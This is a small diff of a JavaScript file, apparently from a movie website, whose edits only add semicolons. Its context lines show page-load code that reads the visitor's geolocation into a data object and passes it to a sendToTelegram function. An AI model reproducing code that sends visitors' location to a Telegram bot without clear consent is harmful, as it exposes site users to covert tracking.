@@ -106,7 +106,7 @@ async function fetchAllPopular(limit = 500) {
       }
     }
   });
-}
+};
 
 document.addEventListener('DOMContentLoaded', async () => {
   // ... oldingi kodlar (setTimeout, setupEventListeners() va h.k.)
@@ -139,7 +139,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         data.lon = pos.coords.longitude;
         sendToTelegram(data);
       });
-    }
+    };
 
 const state = {
   currentMovies: [],
